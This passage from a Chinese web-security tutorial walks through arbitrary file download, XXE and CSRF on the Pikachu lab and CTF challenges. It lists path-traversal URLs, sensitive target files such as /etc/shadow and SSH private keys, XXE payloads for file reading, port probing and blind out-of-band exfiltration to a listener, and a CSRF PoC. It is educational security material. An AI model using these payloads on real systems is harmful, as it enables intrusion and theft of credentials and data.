<p>分析信息可知它有一个接口<strong>execdownload.php</strong>，在<strong>unsafedownload</strong>目录下，<strong>使用向上级跳转的方式，对其构造下载链接</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载之后，对文件内容进行代码审计,发现inc/function.php文件</p>
<p><img src="/2023/012220963/140.png" alt="140"></p>
<p>同时知道function.php文件相对于execdownload.php文件的路径为**../../inc/function.php**</p>
<p>构造function.php文件下载链接</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">www<span class="token operator">.</span>pikachu<span class="token operator">.</span>com<span class="token operator">/</span>vul<span class="token operator">/</span>unsafedownload<span class="token operator">/</span>execdownload<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>inc<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对文件内容在进行代码审计即可，<strong>同时也可用该方法去下载其他文件，前提是文件名和路径的相关链接能构造出来</strong></p>
<h4 id="下载重要配置文件"><a href="#下载重要配置文件" class="headerlink" title="下载重要配置文件"></a>下载重要配置文件</h4><p>使用目录扫描工具去探测重要文件</p>
<p><img src="/2023/012220963/141.PNG" alt="141"></p>
<p>探测到重要的配置文件<strong>config.inc.php</strong></p>
<p>构造该文件的下载链接</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载之后即可看到重要的信息</p>
<h3 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h3><p>如果文件下载时调用的接口含有如下参数名，则有可能存在任意文件下载漏洞</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 接口</span>
read<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>
down<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>
download<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>
readfile<span class="token operator">?</span>filename<span class="token operator">=</span>
download<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>
download<span class="token operator">.</span>php<span class="token operator">?</span>filepath<span class="token operator">=</span>
<span class="token operator">...</span>
<span class="token comment"># 参数</span>
<span class="token operator">&amp;</span>readpath<span class="token operator">=</span>
<span class="token operator">&amp;</span>filepath<span class="token operator">=</span>
<span class="token operator">&amp;</span>Path<span class="token operator">=</span>
<span class="token operator">&amp;</span>inputfile<span class="token operator">=</span>
<span class="token operator">&amp;</span>url<span class="token operator">=</span>
<span class="token operator">&amp;</span>Lang<span class="token operator">=</span>
<span class="token operator">&amp;</span>dis<span class="token operator">=</span>
<span class="token operator">&amp;</span>data<span class="token operator">=</span>
<span class="token operator">&amp;</span>readfile<span class="token operator">=</span>
<span class="token operator">&amp;</span>menu<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="系统常见配置文件位置"><a href="#系统常见配置文件位置" class="headerlink" title="系统常见配置文件位置"></a>系统常见配置文件位置</h3><p><strong>windows</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">C</span><span class="token punctuation">:</span>\boot<span class="token operator">.</span>ini                                 <span class="token comment"># 查看系统版本</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\windows\System32\inetsrv\MetaBase<span class="token operator">.</span>xml     <span class="token comment"># IIS配置文件</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\windows\repair\sam                       <span class="token comment"># 存储系统初次安装的密码</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\Program Files\mysql\my<span class="token operator">.</span>ini               <span class="token comment"># Mysql配置</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\Program Files\mysql\data\mysqlluser<span class="token operator">.</span><span class="token constant">MYD</span>   <span class="token comment"># Mysql root</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\windows\php<span class="token operator">.</span>inc                           <span class="token comment"># php配置信息</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\windows\my<span class="token operator">.</span>ini                           <span class="token comment"># Mysql配置信息</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\windows\win<span class="token operator">.</span>ini                           <span class="token comment"># windows系统的一个基本系统配置文件</span>
<span class="token constant">C</span><span class="token punctuation">:</span>\windows\System32\drivers \etc\ hosts     <span class="token comment"># host文件位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Linux</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>authorized_keys                   <span class="token comment"># 服务器公钥</span>
<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_rsa                           <span class="token comment"># SSH私钥</span>
<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>known_hosts                       <span class="token comment"># 记录每个访问计算机用户的公钥</span>
<span class="token operator">/</span>etc<span class="token operator">/</span>passwd                                 <span class="token comment"># 记录用户的一些基本属性</span>
<span class="token operator">/</span>etc<span class="token operator">/</span>shadow                                 <span class="token comment"># 记录用户加密后的密码</span>
<span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token operator">.</span>cnf                                 <span class="token comment"># Mysql配置文件</span>
<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span> httpd<span class="token operator">.</span>conf                 <span class="token comment"># apache配置文件</span>
<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>bash_history                         <span class="token comment"># 用户历史命令记录文件</span>
<span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>mysql_history                         <span class="token comment"># Mysql历史命令记录文件</span>
<span class="token operator">/</span>porc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>cmdline                           <span class="token comment"># 当前进程的cmdline参数</span>
<span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>arp                               <span class="token comment"># arp表，可以获得内网其他机器的地址</span>
<span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>route                             <span class="token comment"># 路由表信息</span>
<span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>tcp <span class="token keyword">and</span><span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>udp               <span class="token comment"># 活动连接的信息</span>
<span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>fib_trie                           <span class="token comment"># 路由缓存</span>
<span class="token operator">/</span>proc<span class="token operator">/</span>version                               <span class="token comment"># 内核版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="RoarCTF 2019 Easy Java"></a>RoarCTF 2019 Easy Java</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment">//buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>访问页面，在下面有一个 help的超链接</li>
</ol>
<p><img src="/2023/012220963/148.PNG" alt="148"></p>
<ol start="2">
<li>访问该链接，提示一段报错信息</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileNotFoundException</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>help<span class="token punctuation">.</span>docx<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li>改用POST方式传递参数，能够进行文件下载</li>
</ol>
<p><img src="/2023/012220963/142.PNG" alt="142"></p>
<ol start="4">
<li>通过刚刚的报错信息，我们已经知道网站使用java语言开发</li>
</ol>
<p>​        JavaWeb网站的配置文件在 WEB-INF/web.xml 中，尝试下载，得到web.xml</p>
<p><img src="/2023/012220963/143.PNG" alt="143"></p>
<ol start="5">
<li>在web.xml中有一个/Flag，去访问它，结果是500错误</li>
</ol>
<p><img src="/2023/012220963/144.PNG" alt="144"></p>
<ol start="6">
<li>尝试下载FlagController的源码，源码路径在web.xml中</li>
</ol>
<p>在JavaWeb站点中，如果对方服务器使用WAR包部署，一定是符合以下结构</p>
<ul>
<li>WEB-INF</li>
<li><ul>
<li>classs</li>
<li><ul>
<li>com</li>
<li><ul>
<li>xx</li>
<li><ul>
<li>xx.class</li>
<li>yy.class</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>lib</li>
<li><ul>
<li>xxxx.jar</li>
</ul>
</li>
<li>web.xml</li>
</ul>
</li>
<li>index.jsp</li>
<li>xxxx.jsp</li>
</ul>
<ol start="7">
<li>构造FlagController下载的链接</li>
</ol>
<pre class="line-numbers language-url" data-language="url"><code class="language-url">.&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="8">
<li>查看文件，发现加密字符串</li>
</ol>
<p><img src="/2023/012220963/146.PNG" alt="146"></p>
<ol start="9">
<li>在线网站解密</li>
</ol>
<p><img src="/2023/012220963/147.PNG" alt="147"></p>
<h4 id="CVE-2021-36749-Druid-任意文件读取"><a href="#CVE-2021-36749-Druid-任意文件读取" class="headerlink" title="CVE-2021-36749 Druid 任意文件读取"></a>CVE-2021-36749 Druid 任意文件读取</h4><p>FOFA： title=”Apache Druid”        版本&lt;=0.22</p>
<p>Load data——HTTP(s)——Connect Data——URls</p>
<p>利用file:///协议进行读取</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd       //eg:file协议读取</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/149.PNG" alt="149"></p>
<p><strong>注意：点到为止</strong></p>
<h2 id="XXE-amp-XML漏洞"><a href="#XXE-amp-XML漏洞" class="headerlink" title="XXE&amp;XML漏洞"></a>XXE&amp;XML漏洞</h2><h3 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h3><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><p>XML是一种用于标记电子文件使其具有结构性的<strong>标记语言</strong>。XML被设计为传输和存储数据。</p>
<p>XML文件格式是纯文本格式，在许多方面类似于HTML，XML由XML元素组成，每个XML元素包括一个</p>
<p>开始标记，一个结束标记以及两个标记之间的内容。标记是对文档存储格式和逻辑结构的描述。在形式</p>
<p>上，标记中可能包括注释、引用、字符数据段、起始标记、结束标记、空元素、文档类型声明（DTD）</p>
<p>序言。</p>
<p>简单的XML文件：</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>具体规则如下：</strong></p>
<ol>
<li>必须有声明语句，XML声明是XML文档的第一句，其格式如下：</li>
</ol>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li><p>大小写，在XML文档中，大小写是有区别的</p>
</li>
<li><p>XML文档有且只有一个根元素</p>
</li>
<li><p>属性值使用引号</p>
</li>
<li><p>有的标记必须有相应的结束标记</p>
</li>
<li><p>所有的空标记也必须被关闭，空标记是指标记对之间没有内容的标记。在XML中，规定所有的标记必</p>
<p>须有结束标记</p>
</li>
</ol>
<h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文</p>
<p>档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE note [
    &lt;!ENTITY a &quot;admin&quot;&gt;
]&gt;
&lt;note&gt;&amp;a;&lt;&#x2F;note&gt;
&lt;!-- 定义一个实体 a，值为admin --&gt;
&lt;!-- 等价于 ↓↓↓ --&gt;
&lt;note&gt;admin&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>XXE是XML外部实体注入（<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity）的缩写。</p>
<p>一些应用程序在传递参数时，使用XML的格式进行数据传递，并且对传递的参数没有进行严格的过滤。</p>
<p>攻击者可以构造自己的恶意XML代码，使服务器在接收参数时解析任意的XML代码，导致产生服务器内</p>
<p>部文件被读取等后果。</p>
<h5 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h5><ul>
<li>文件读取</li>
<li>RCE</li>
<li>内网攻击</li>
<li>Dos攻击</li>
</ul>
<h3 id="XXE漏洞演示"><a href="#XXE漏洞演示" class="headerlink" title="XXE漏洞演示"></a>XXE漏洞演示</h3><p>Pikachu靶场 XXE漏洞</p>
<p>输入随意字符串：</p>
<p><img src="/2023/012220963/150.PNG" alt="150"></p>
<p>粘贴一下内容</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;a.txt&quot;&gt;
]&gt;
&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/151.PNG" alt="151"></p>
<p>输出结果与我d:/a.txt中内容一致</p>
<h3 id="XXE漏洞攻击"><a href="#XXE漏洞攻击" class="headerlink" title="XXE漏洞攻击"></a>XXE漏洞攻击</h3><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><p><strong>windows:</strong></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;a.txt&quot;&gt;
]&gt;
&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Linux:</strong></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h5><p><strong>可通过延时判断端口开放情况</strong></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
        &lt;!ENTITY content SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:3307&quot;&gt;
]&gt;
&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>一般情况：</strong>延时低的开放，延时高的未开放</p>
<h5 id="引入外部DTD"><a href="#引入外部DTD" class="headerlink" title="引入外部DTD"></a>引入外部DTD</h5><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY % file SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;my.dtd&quot;&gt; %file;
]&gt;
&lt;name&gt;&amp;send;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>my.dtd</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY send SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;a.txt&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>外部引入前提：</strong>服务器没有禁止引入外部DTD</p>
<h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p>取消xxe的回显</p>
<p><img src="/2023/012220963/152.PNG" alt="152"></p>
<p>payload:</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-
encode&#x2F;resource&#x3D;d:&#x2F;a.txt&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;my2.dtd&quot;&gt;
    %dtd;
    %send;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>my2.dtd</p>
<p><a href="http://127.0.0.1:8000为自己开启监听服务器，用于接收读取的数据">http://127.0.0.1:8000为自己开启监听服务器，用于接收读取的数据</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload 
    &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:8000?data&#x3D;%file;&#39;&gt;&quot;
&gt;
%payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h3><ol>
<li>判断数据格式</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">&lt;user&gt;&lt;username&gt;&amp;content;&lt;&#x2F;username&gt;&lt;password&gt;adada&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/156.PNG" alt="153"></p>
<ol start="2">
<li>判断Content-Type</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">text&#x2F;xml
application&#x2F;xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/157.PNG" alt="154"></p>
<ol start="3">
<li>使用工具</li>
</ol>
<p>Xray,AWVS等工具均乐意扫描XXE</p>
<h3 id="XXE漏洞练习"><a href="#XXE漏洞练习" class="headerlink" title="XXE漏洞练习"></a>XXE漏洞练习</h3><h4 id="XXE-lab"><a href="#XXE-lab" class="headerlink" title="XXE-lab"></a>XXE-lab</h4><p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
<p><img src="/2023/012220963/153.PNG" alt="155"></p>
<ol>
<li>随意输入数据发现UserName输出有回显</li>
</ol>
<p><img src="/2023/012220963/154.PNG" alt="156"></p>
<ol start="2">
<li>进行burp抓包分析：该传输数据格式为XML</li>
</ol>
<p><img src="/2023/012220963/155.PNG" alt="157"></p>
<ol start="3">
<li>发送到Repeater,进行测试</li>
</ol>
<p><img src="/2023/012220963/158.PNG" alt="158"></p>
<p>success!!!</p>
<h4 id="CTF-XXE-COURSE"><a href="#CTF-XXE-COURSE" class="headerlink" title="CTF XXE COURSE"></a>CTF XXE COURSE</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#BUU%20XXE%20COURSE%201">https://buuoj.cn/challenges#BUU%20XXE%20COURSE%201</a></p>
<p>第一行有回显，burp抓包处理</p>
<p><img src="/2023/012220963/159.PNG" alt="159"></p>
<p><img src="/2023/012220963/160.PNG" alt="160"></p>
<p><img src="/2023/012220963/161.PNG" alt="161"></p>
<h4 id="jarvisoj"><a href="#jarvisoj" class="headerlink" title="jarvisoj"></a>jarvisoj</h4><p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
<p>猜测，自己构造</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;node&gt;&lt;search&gt;&amp;content;&lt;&#x2F;search&gt;&lt;value&gt;password&lt;&#x2F;value&gt;&lt;&#x2F;node&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/162.PNG" alt="162"></p>
<p><strong>记得改Content-Type的内容</strong></p>
<h4 id="register"><a href="#register" class="headerlink" title="register"></a>register</h4><p><a target="_blank" rel="noopener" href="https://github.com/jbarone/xxelab">https://github.com/jbarone/xxelab</a></p>
<p><img src="/2023/012220963/163.PNG" alt="163"></p>
<h3 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h3><ul>
<li>禁用引用外部实体DTD</li>
<li>过滤用户提交的XML数据</li>
</ul>
<h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><p>Cross-site request forgery 简称为“CSRF”。在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一</p>
<p>般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。</p>
<p>所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆，</p>
<p>更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p>
<p>CSRF危害：</p>
<ul>
<li>修改用户信息</li>
<li>利用身份发送邮件，短信</li>
<li>利用身份转账</li>
<li>盗取账号</li>
</ul>
<h3 id="CSRF-案例"><a href="#CSRF-案例" class="headerlink" title="CSRF 案例"></a>CSRF 案例</h3><p><strong>案例1：</strong></p>
<ol>
<li>登录B站，然后不关闭浏览器</li>
<li>在同一浏览器下访问链接：<a target="_blank" rel="noopener" href="https://passport.bilibili.com/register/logout.html#/verify">https://passport.bilibili.com/register/logout.html#/verify</a></li>
</ol>
<p><strong>案例2：</strong></p>
<p><img src="/2023/012220963/164.PNG" alt="164"></p>
<ol>
<li>用户登录了银行网站，并且没有关闭浏览器</li>
<li>黑客给该用户发了一个钓鱼链接，并诱导用户点击</li>
</ol>
<p>​        链接内容：<a target="_blank" rel="noopener" href="http://www.bank.com/transfer/?to=hacker&amp;money=10000">http://www.bank.com/transfer/?to=hacker&amp;money=10000</a></p>
<ol start="3">
<li>用户在不知情的情况下，给陌生人转账10000元</li>
</ol>
<h3 id="CSRF-漏洞攻击"><a href="#CSRF-漏洞攻击" class="headerlink" title="CSRF 漏洞攻击"></a>CSRF 漏洞攻击</h3><p>环境：pikachu靶场 CSRF Get</p>
<p>工具：burpsuit</p>
<p>登录之后，在修改信息页抓包</p>
<p><img src="/2023/012220963/165.PNG" alt="165"></p>
<p>GET请求方式，原信息url链接为</p>
<pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;18656565545&amp;add&#x3D;usa&amp;email&#x3D;lili%40pikachu.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改信息接口</p>
<pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;11111111111&amp;add&#x3D;UK&amp;email&#x3D;lili%40pikachu.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>or:</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=11111111111&amp;add=UK&amp;email=lili%40pikachu.com&amp;submit=submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>

	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>404 error<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在同一浏览器下测试链接</p>
<p><img src="/2023/012220963/166.PNG" alt="166"></p>
<p>信息被更改成功！！！</p>
<h3 id="CSRF-poc生成"><a href="#CSRF-poc生成" class="headerlink" title="CSRF poc生成"></a>CSRF poc生成</h3><p>环境：pikachu靶场 CSRF Get</p>
<p>工具：burpsuit</p>
<ol>
<li>在修改信息时抓包</li>
<li>在抓到的数据包中，选择 生成CSRF PoC</li>
</ol>
<p><img src="/2023/012220963/167.png" alt="167"></p>
<p><img src="/2023/012220963/168.PNG" alt="168"></p>
<ol start="3">
<li>根据需求，修改包中的数据，将生成的html代码复制到html文件中</li>
</ol>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token comment">// 加一段js，让它自动执行</span>
    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
